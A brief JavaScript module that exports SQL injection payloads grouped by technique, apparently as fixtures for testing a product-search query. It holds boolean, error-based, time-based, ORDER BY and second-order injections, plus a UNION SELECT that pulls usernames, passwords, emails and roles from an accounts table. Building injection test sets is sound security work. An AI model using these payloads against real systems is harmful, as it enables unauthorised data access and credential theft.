export const payloads = {
  normal: ["iPhone"],
  booleanBased: ["%' OR 1=1 -- "],
  unionBased: [
    "%' UNION SELECT 1, username, password, 0, 0, created_at, updated_at, 1, email, 1, role, 'leak', 1, '' FROM accounts -- ",
  ],
  errorBased: ["%' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE())) -- "],
  timeBased: ["%' AND IF(1=1,SLEEP(2),0) --"],
  orderBy: ["p.price DESC, (SELECT SLEEP(2))"],
  secondOrder: ["Nice product UNION SELECT password FROM accounts"],
};

